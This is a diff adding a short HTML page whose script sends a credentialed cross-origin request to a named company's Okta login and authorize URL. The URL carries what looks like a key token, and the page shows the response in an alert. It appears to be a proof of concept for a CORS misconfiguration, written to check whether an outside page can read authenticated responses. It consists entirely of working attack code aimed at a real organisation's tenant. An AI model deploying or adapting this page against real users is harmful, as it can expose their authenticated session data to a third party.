@@ -1,0 +1,5 @@
+<html>
+<script>
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://fireeye.okta.com/login/login.htm?fromURI=/oauth2/v1/authorize/redirect?okta_key=2CvpDHH5lg1PdBaxc5qW-5a6-ruqeqSrKrY8dxCC03',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
+</script>
+</html>
